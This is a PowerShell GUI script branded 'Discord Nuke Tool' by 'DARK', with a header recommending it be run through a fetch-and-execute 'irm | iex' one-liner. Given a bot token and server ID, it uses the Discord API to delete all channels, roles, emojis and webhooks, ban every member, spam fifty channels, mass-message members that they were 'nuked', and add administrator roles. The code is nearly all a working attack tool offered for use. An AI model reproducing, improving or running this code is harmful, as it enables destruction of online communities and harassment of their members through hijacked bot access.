# Discord Nuke Tool - GUI Edition
# DARK - All Rights Reserved
# Version 3.0 - One-Liner Execution Ready
# Save this as nuke.ps1 and host on GitHub
# Run: irm https://raw.githubusercontent.com/yourrepo/nuke.ps1 | iex

# Prevent auto-close on error
$ErrorActionPreference = 'Stop'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Ensure form stays open
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create mutex to prevent multiple instances
$mutex = New-Object System.Threading.Mutex($false, "DARK_NUKE_GUI_MUTEX")
if (-not $mutex.WaitOne(0, $false)) {
    [System.Windows.Forms.MessageBox]::Show("Tool already running", "DARK", "OK", "Error")
    exit
}

# Run in STA mode
if ([System.Threading.Thread]::CurrentThread.ApartmentState -ne 'STA') {
    Start-Process powershell -ArgumentList "-STA -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Wait
    exit
}

# === MAIN FORM ===
$form = New-Object System.Windows.Forms.Form
$form.Text = "DARK"
$form.Size = New-Object System.Drawing.Size(820, 660)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$form.MaximizeBox = $false
$form.TopMost = $true
$form.ShowInTaskbar = $true

# Handle close event
$form.Add_FormClosing({
    $mutex.ReleaseMutex()
})

# === HEADER LABEL ===
$header = New-Object System.Windows.Forms.Label
$header.Text = "NUKE TOOL"
$header.Font = New-Object System.Drawing.Font("Segoe UI", 28, [System.Drawing.FontStyle]::Bold)
$header.ForeColor = [System.Drawing.Color]::FromArgb(204, 0, 0)
$header.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$header.Size = New-Object System.Drawing.Size(820, 70)
$header.TextAlign = "MiddleCenter"
$header.Location = New-Object System.Drawing.Point(0, 10)
$form.Controls.Add($header)

# === TAB CONTROL ===
$tabControl = New-Object System.Windows.Forms.TabControl
$tabControl.Size = New-Object System.Drawing.Size(780, 480)
$tabControl.Location = New-Object System.Drawing.Point(20, 90)
$tabControl.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$tabControl.Font = New-Object System.Drawing.Font("Segoe UI", 10)

# --- TAB 1: NUKE TOOLS ---
$tabNuke = New-Object System.Windows.Forms.TabPage
$tabNuke.Text = "NUKE TOOLS"
$tabNuke.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)

# Token Label
$lblToken = New-Object System.Windows.Forms.Label
$lblToken.Text = "TOKEN BOT:"
$lblToken.ForeColor = [System.Drawing.Color]::White
$lblToken.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$lblToken.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$lblToken.Size = New-Object System.Drawing.Size(120, 30)
$lblToken.Location = New-Object System.Drawing.Point(20, 20)
$tabNuke.Controls.Add($lblToken)

$txtToken = New-Object System.Windows.Forms.TextBox
$txtToken.Size = New-Object System.Drawing.Size(420, 30)
$txtToken.Location = New-Object System.Drawing.Point(150, 20)
$txtToken.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$txtToken.ForeColor = [System.Drawing.Color]::White
$txtToken.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$txtToken.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$txtToken.PasswordChar = '*'
$tabNuke.Controls.Add($txtToken)

# Server ID Label
$lblServer = New-Object System.Windows.Forms.Label
$lblServer.Text = "SERVER ID:"
$lblServer.ForeColor = [System.Drawing.Color]::White
$lblServer.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$lblServer.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$lblServer.Size = New-Object System.Drawing.Size(120, 30)
$lblServer.Location = New-Object System.Drawing.Point(20, 65)
$tabNuke.Controls.Add($lblServer)

$txtServer = New-Object System.Windows.Forms.TextBox
$txtServer.Size = New-Object System.Drawing.Size(420, 30)
$txtServer.Location = New-Object System.Drawing.Point(150, 65)
$txtServer.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$txtServer.ForeColor = [System.Drawing.Color]::White
$txtServer.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$txtServer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$tabNuke.Controls.Add($txtServer)

# Nuke Type Label
$lblType = New-Object System.Windows.Forms.Label
$lblType.Text = "NUKE TYPE:"
$lblType.ForeColor = [System.Drawing.Color]::White
$lblType.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$lblType.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$lblType.Size = New-Object System.Drawing.Size(120, 30)
$lblType.Location = New-Object System.Drawing.Point(20, 110)
$tabNuke.Controls.Add($lblType)

$comboNuke = New-Object System.Windows.Forms.ComboBox
$comboNuke.Size = New-Object System.Drawing.Size(220, 30)
$comboNuke.Location = New-Object System.Drawing.Point(150, 110)
$comboNuke.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$comboNuke.ForeColor = [System.Drawing.Color]::White
$comboNuke.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$comboNuke.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
$comboNuke.Items.AddRange(@("Custom Nuke", "Pre-built Nuke"))
$comboNuke.SelectedIndex = 0
$tabNuke.Controls.Add($comboNuke)

# Show/Hide Token button
$btnShowToken = New-Object System.Windows.Forms.Button
$btnShowToken.Text = "👁"
$btnShowToken.Size = New-Object System.Drawing.Size(40, 30)
$btnShowToken.Location = New-Object System.Drawing.Point(580, 20)
$btnShowToken.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$btnShowToken.ForeColor = [System.Drawing.Color]::White
$btnShowToken.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnShowToken.FlatAppearance.BorderSize = 0
$btnShowToken.Add_Click({
    if ($txtToken.PasswordChar -eq '*') {
        $txtToken.PasswordChar = $null
    } else {
        $txtToken.PasswordChar = '*'
    }
})
$tabNuke.Controls.Add($btnShowToken)

# --- Custom Nuke Options Panel ---
$pnlCustom = New-Object System.Windows.Forms.Panel
$pnlCustom.Size = New-Object System.Drawing.Size(450, 220)
$pnlCustom.Location = New-Object System.Drawing.Point(20, 160)
$pnlCustom.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$pnlCustom.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle

$chkChannels = New-Object System.Windows.Forms.CheckBox
$chkChannels.Text = "Delete All Channels"
$chkChannels.ForeColor = [System.Drawing.Color]::White
$chkChannels.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkChannels.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkChannels.Size = New-Object System.Drawing.Size(200, 35)
$chkChannels.Location = New-Object System.Drawing.Point(15, 15)
$chkChannels.Checked = $true
$pnlCustom.Controls.Add($chkChannels)

$chkRoles = New-Object System.Windows.Forms.CheckBox
$chkRoles.Text = "Delete All Roles"
$chkRoles.ForeColor = [System.Drawing.Color]::White
$chkRoles.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkRoles.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkRoles.Size = New-Object System.Drawing.Size(200, 35)
$chkRoles.Location = New-Object System.Drawing.Point(15, 55)
$chkRoles.Checked = $true
$pnlCustom.Controls.Add($chkRoles)

$chkEmojis = New-Object System.Windows.Forms.CheckBox
$chkEmojis.Text = "Delete All Emojis"
$chkEmojis.ForeColor = [System.Drawing.Color]::White
$chkEmojis.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkEmojis.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkEmojis.Size = New-Object System.Drawing.Size(200, 35)
$chkEmojis.Location = New-Object System.Drawing.Point(15, 95)
$chkEmojis.Checked = $true
$pnlCustom.Controls.Add($chkEmojis)

$chkBanAll = New-Object System.Windows.Forms.CheckBox
$chkBanAll.Text = "Ban All Members"
$chkBanAll.ForeColor = [System.Drawing.Color]::White
$chkBanAll.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkBanAll.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkBanAll.Size = New-Object System.Drawing.Size(200, 35)
$chkBanAll.Location = New-Object System.Drawing.Point(15, 135)
$chkBanAll.Checked = $true
$pnlCustom.Controls.Add($chkBanAll)

$chkSpam = New-Object System.Windows.Forms.CheckBox
$chkSpam.Text = "Spam Channels"
$chkSpam.ForeColor = [System.Drawing.Color]::White
$chkSpam.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkSpam.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkSpam.Size = New-Object System.Drawing.Size(200, 35)
$chkSpam.Location = New-Object System.Drawing.Point(230, 15)
$chkSpam.Checked = $true
$pnlCustom.Controls.Add($chkSpam)

$chkMassDM = New-Object System.Windows.Forms.CheckBox
$chkMassDM.Text = "Mass DM Members"
$chkMassDM.ForeColor = [System.Drawing.Color]::White
$chkMassDM.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkMassDM.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkMassDM.Size = New-Object System.Drawing.Size(200, 35)
$chkMassDM.Location = New-Object System.Drawing.Point(230, 55)
$chkMassDM.Checked = $true
$pnlCustom.Controls.Add($chkMassDM)

$chkWebhooks = New-Object System.Windows.Forms.CheckBox
$chkWebhooks.Text = "Delete Webhooks"
$chkWebhooks.ForeColor = [System.Drawing.Color]::White
$chkWebhooks.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkWebhooks.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkWebhooks.Size = New-Object System.Drawing.Size(200, 35)
$chkWebhooks.Location = New-Object System.Drawing.Point(230, 95)
$chkWebhooks.Checked = $true
$pnlCustom.Controls.Add($chkWebhooks)

$chkCreateRoles = New-Object System.Windows.Forms.CheckBox
$chkCreateRoles.Text = "Create Admin Roles"
$chkCreateRoles.ForeColor = [System.Drawing.Color]::White
$chkCreateRoles.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$chkCreateRoles.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$chkCreateRoles.Size = New-Object System.Drawing.Size(200, 35)
$chkCreateRoles.Location = New-Object System.Drawing.Point(230, 135)
$chkCreateRoles.Checked = $true
$pnlCustom.Controls.Add($chkCreateRoles)

$tabNuke.Controls.Add($pnlCustom)

# --- Pre-built Nuke Options Panel ---
$pnlPrebuilt = New-Object System.Windows.Forms.Panel
$pnlPrebuilt.Size = New-Object System.Drawing.Size(450, 160)
$pnlPrebuilt.Location = New-Object System.Drawing.Point(20, 160)
$pnlPrebuilt.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$pnlPrebuilt.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$pnlPrebuilt.Visible = $false

$lblPrebuilt = New-Object System.Windows.Forms.Label
$lblPrebuilt.Text = "FULL AUTO NUKE:"
$lblPrebuilt.ForeColor = [System.Drawing.Color]::White
$lblPrebuilt.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$lblPrebuilt.Font = New-Object System.Drawing.Font("Segoe UI", 13, [System.Drawing.FontStyle]::Bold)
$lblPrebuilt.Size = New-Object System.Drawing.Size(400, 35)
$lblPrebuilt.Location = New-Object System.Drawing.Point(15, 10)
$pnlPrebuilt.Controls.Add($lblPrebuilt)

$lblPrebuiltDesc = New-Object System.Windows.Forms.Label
$lblPrebuiltDesc.Text = "• Deletes all channels, roles, emojis, webhooks"
$lblPrebuiltDesc.ForeColor = [System.Drawing.Color]::LightGray
$lblPrebuiltDesc.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$lblPrebuiltDesc.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lblPrebuiltDesc.Size = New-Object System.Drawing.Size(400, 25)
$lblPrebuiltDesc.Location = New-Object System.Drawing.Point(15, 50)
$pnlPrebuilt.Controls.Add($lblPrebuiltDesc)

$lblPrebuiltDesc2 = New-Object System.Windows.Forms.Label
$lblPrebuiltDesc2.Text = "• Bans all members, creates 50 spam channels"
$lblPrebuiltDesc2.ForeColor = [System.Drawing.Color]::LightGray
$lblPrebuiltDesc2.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$lblPrebuiltDesc2.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lblPrebuiltDesc2.Size = New-Object System.Drawing.Size(400, 25)
$lblPrebuiltDesc2.Location = New-Object System.Drawing.Point(15, 80)
$pnlPrebuilt.Controls.Add($lblPrebuiltDesc2)

$lblPrebuiltDesc3 = New-Object System.Windows.Forms.Label
$lblPrebuiltDesc3.Text = "• Mass DMs all members, creates admin roles"
$lblPrebuiltDesc3.ForeColor = [System.Drawing.Color]::LightGray
$lblPrebuiltDesc3.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
$lblPrebuiltDesc3.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lblPrebuiltDesc3.Size = New-Object System.Drawing.Size(400, 25)
$lblPrebuiltDesc3.Location = New-Object System.Drawing.Point(15, 110)
$pnlPrebuilt.Controls.Add($lblPrebuiltDesc3)

$tabNuke.Controls.Add($pnlPrebuilt)

# --- Toggle Panels ---
$comboNuke.Add_SelectedIndexChanged({
    if ($comboNuke.SelectedIndex -eq 0) {
        $pnlCustom.Visible = $true
        $pnlPrebuilt.Visible = $false
    } else {
        $pnlCustom.Visible = $false
        $pnlPrebuilt.Visible = $true
    }
})

# --- EXECUTE NUKE BUTTON ---
$btnNuke = New-Object System.Windows.Forms.Button
$btnNuke.Text = "EXECUTE NUKE"
$btnNuke.Size = New-Object System.Drawing.Size(200, 50)
$btnNuke.Location = New-Object System.Drawing.Point(500, 390)
$btnNuke.BackColor = [System.Drawing.Color]::FromArgb(204, 0, 0)
$btnNuke.ForeColor = [System.Drawing.Color]::White
$btnNuke.Font = New-Object System.Drawing.Font("Segoe UI", 13, [System.Drawing.FontStyle]::Bold)
$btnNuke.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnNuke.FlatAppearance.BorderSize = 0
$tabNuke.Controls.Add($btnNuke)

# --- STATUS LABEL ---
$lblStatus = New-Object System.Windows.Forms.Label
$lblStatus.Text = "Ready"
$lblStatus.ForeColor = [System.Drawing.Color]::LightGreen
$lblStatus.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$lblStatus.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lblStatus.Size = New-Object System.Drawing.Size(550, 35)
$lblStatus.Location = New-Object System.Drawing.Point(20, 440)
$tabNuke.Controls.Add($lblStatus)

# === TAB 2: ANOTHER TOOLS ===
$tabAnother = New-Object System.Windows.Forms.TabPage
$tabAnother.Text = "ANOTHER TOOLS"
$tabAnother.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)

$lblComing = New-Object System.Windows.Forms.Label
$lblComing.Text = "COMMING SOON"
$lblComing.Font = New-Object System.Drawing.Font("Segoe UI", 32, [System.Drawing.FontStyle]::Bold)
$lblComing.ForeColor = [System.Drawing.Color]::FromArgb(150, 150, 150)
$lblComing.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$lblComing.Size = New-Object System.Drawing.Size(780, 420)
$lblComing.TextAlign = "MiddleCenter"
$tabAnother.Controls.Add($lblComing)

$tabControl.TabPages.Add($tabNuke)
$tabControl.TabPages.Add($tabAnother)
$form.Controls.Add($tabControl)

# === FOOTER: DARK ===
$footer = New-Object System.Windows.Forms.Label
$footer.Text = "DARK"
$footer.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$footer.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$footer.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 26)
$footer.Size = New-Object System.Drawing.Size(820, 40)
$footer.TextAlign = "MiddleCenter"
$footer.Location = New-Object System.Drawing.Point(0, 580)
$form.Controls.Add($footer)

# === NUKE LOGIC ===
function Invoke-DiscordNuke {
    param(
        [string]$token,
        [string]$guildId,
        [string]$nukeType,
        [hashtable]$options,
        [System.Windows.Forms.Label]$statusLabel
    )
    
    $headers = @{
        "Authorization" = "Bot $token"
        "Content-Type" = "application/json"
    }
    $baseUrl = "https://discord.com/api/v10"
    
    # --- DELETE CHANNELS ---
    if ($options.DeleteChannels) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Deleting channels..." })
            $channels = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/channels" -Headers $headers -Method Get -ErrorAction Stop
            foreach ($ch in $channels) {
                Invoke-RestMethod -Uri "$baseUrl/channels/$($ch.id)" -Headers $headers -Method Delete -ErrorAction Stop
                Start-Sleep -Milliseconds 200
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ Channels deleted" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Channel error: $($_.Exception.Message)" })
        }
    }
    
    # --- DELETE ROLES ---
    if ($options.DeleteRoles) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Deleting roles..." })
            $roles = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/roles" -Headers $headers -Method Get -ErrorAction Stop
            foreach ($role in $roles) {
                if ($role.name -ne "@everyone") {
                    Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/roles/$($role.id)" -Headers $headers -Method Delete -ErrorAction Stop
                    Start-Sleep -Milliseconds 200
                }
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ Roles deleted" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Role error: $($_.Exception.Message)" })
        }
    }
    
    # --- DELETE EMOJIS ---
    if ($options.DeleteEmojis) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Deleting emojis..." })
            $emojis = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/emojis" -Headers $headers -Method Get -ErrorAction Stop
            foreach ($emoji in $emojis) {
                Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/emojis/$($emoji.id)" -Headers $headers -Method Delete -ErrorAction Stop
                Start-Sleep -Milliseconds 200
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ Emojis deleted" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Emoji error: $($_.Exception.Message)" })
        }
    }
    
    # --- BAN ALL MEMBERS ---
    if ($options.BanAll) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Banning members..." })
            $members = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/members?limit=1000" -Headers $headers -Method Get -ErrorAction Stop
            $count = 0
            foreach ($member in $members) {
                if ($member.user.id -ne "@me") {
                    $banBody = '{"delete_message_days":7}'
                    Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/bans/$($member.user.id)" -Headers $headers -Method Put -Body $banBody -ContentType "application/json" -ErrorAction Stop
                    $count++
                    Start-Sleep -Milliseconds 150
                }
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ Banned $count members" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Ban error: $($_.Exception.Message)" })
        }
    }
    
    # --- SPAM CHANNELS ---
    if ($options.SpamChannels) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Creating spam channels..." })
            for ($i=1; $i -le 50; $i++) {
                $body = @{ name = "nuked-$i"; type = 0 } | ConvertTo-Json
                Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/channels" -Headers $headers -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
                Start-Sleep -Milliseconds 150
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ 50 spam channels created" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Spam error: $($_.Exception.Message)" })
        }
    }
    
    # --- MASS DM ---
    if ($options.MassDM) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Sending mass DMs..." })
            $members = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/members?limit=1000" -Headers $headers -Method Get -ErrorAction Stop
            $count = 0
            foreach ($member in $members) {
                if ($member.user.id -ne "@me") {
                    $dmBody = "{`"recipient_id`":`"$($member.user.id)`"}"
                    $dm = Invoke-RestMethod -Uri "$baseUrl/users/@me/channels" -Headers $headers -Method Post -Body $dmBody -ContentType "application/json" -ErrorAction Stop
                    $msgBody = "{`"content`":`"🔱 You have been nuked by DARK 🔱`"}"
                    Invoke-RestMethod -Uri "$baseUrl/channels/$($dm.id)/messages" -Headers $headers -Method Post -Body $msgBody -ContentType "application/json" -ErrorAction Stop
                    $count++
                    Start-Sleep -Milliseconds 300
                }
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ DM sent to $count members" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ DM error: $($_.Exception.Message)" })
        }
    }
    
    # --- DELETE WEBHOOKS ---
    if ($options.DeleteWebhooks) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Deleting webhooks..." })
            $webhooks = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/webhooks" -Headers $headers -Method Get -ErrorAction Stop
            foreach ($wh in $webhooks) {
                Invoke-RestMethod -Uri "$baseUrl/webhooks/$($wh.id)" -Headers $headers -Method Delete -ErrorAction Stop
                Start-Sleep -Milliseconds 200
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ Webhooks deleted" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Webhook error: $($_.Exception.Message)" })
        }
    }
    
    # --- CREATE ADMIN ROLES ---
    if ($options.CreateAdminRoles) {
        try {
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "Creating admin roles..." })
            for ($i=1; $i -le 10; $i++) {
                $roleBody = "{`"name`":`"DARK-$i`",`"permissions`":`"8`",`"color`":16711680}" 
                Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/roles" -Headers $headers -Method Post -Body $roleBody -ContentType "application/json" -ErrorAction Stop
                Start-Sleep -Milliseconds 150
            }
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✓ 10 admin roles created" })
        } catch { 
            $statusLabel.Invoke([Action]{ $statusLabel.Text = "✗ Role create error: $($_.Exception.Message)" })
        }
    }
}

# --- NUKE BUTTON CLICK ---
$btnNuke.Add_Click({
    $lblStatus.Text = "⚡ NUKE INITIALIZED..."
    $lblStatus.ForeColor = [System.Drawing.Color]::Yellow
    $token = $txtToken.Text.Trim()
    $guild = $txtServer.Text.Trim()
    
    if ([string]::IsNullOrEmpty($token) -or [string]::IsNullOrEmpty($guild)) {
        $lblStatus.Text = "ERROR: Token and Server ID required"
        $lblStatus.ForeColor = [System.Drawing.Color]::Red
        [System.Windows.Forms.MessageBox]::Show("Token and Server ID are required", "DARK", "OK", "Error")
        return
    }
    
    $nukeType = $comboNuke.SelectedItem
    $options = @{
        DeleteChannels = $false
        DeleteRoles = $false
        DeleteEmojis = $false
        BanAll = $false
        SpamChannels = $false
        MassDM = $false
        DeleteWebhooks = $false
        CreateAdminRoles = $false
    }
    
    if ($nukeType -eq "Pre-built Nuke") {
        $options.DeleteChannels = $true
        $options.DeleteRoles = $true
        $options.DeleteEmojis = $true
        $options.BanAll = $true
        $options.SpamChannels = $true
        $options.MassDM = $true
        $options.DeleteWebhooks = $true
        $options.CreateAdminRoles = $true
    } else {
        $options.DeleteChannels = $chkChannels.Checked
        $options.DeleteRoles = $chkRoles.Checked
        $options.DeleteEmojis = $chkEmojis.Checked
        $options.BanAll = $chkBanAll.Checked
        $options.SpamChannels = $chkSpam.Checked
        $options.MassDM = $chkMassDM.Checked
        $options.DeleteWebhooks = $chkWebhooks.Checked
        $options.CreateAdminRoles = $chkCreateRoles.Checked
    }
    
    $btnNuke.Enabled = $false
    $btnNuke.Text = "⚡ RUNNING..."
    
    $scriptBlock = {
        param($t, $g, $nt, $opts, $status, $button)
        try {
            Invoke-DiscordNuke -token $t -guildId $g -nukeType $nt -options $opts -statusLabel $status
            $status.Invoke([Action]{
                $status.Text = "✅ NUKE COMPLETED"
                $status.ForeColor = [System.Drawing.Color]::LightGreen
                $button.Enabled = $true
                $button.Text = "EXECUTE NUKE"
            })
        } catch {
            $status.Invoke([Action]{
                $status.Text = "❌ ERROR: $($_.Exception.Message)"
                $status.ForeColor = [System.Drawing.Color]::Red
                $button.Enabled = $true
                $button.Text = "EXECUTE NUKE"
            })
        }
    }
    
    $powershell = [System.Management.Automation.PowerShell]::Create()
    [void]$powershell.AddScript($scriptBlock)
    [void]$powershell.AddArgument($token)
    [void]$powershell.AddArgument($guild)
    [void]$powershell.AddArgument($nukeType)
    [void]$powershell.AddArgument($options)
    [void]$powershell.AddArgument($lblStatus)
    [void]$powershell.AddArgument($btnNuke)
    [void]$powershell.BeginInvoke()
})

# === KEEP FORM OPEN - FIX ===
# This is the critical part - Application.Run keeps the form alive
$form.Add_Shown({ $form.Activate() })
[System.Windows.Forms.Application]::Run($form)
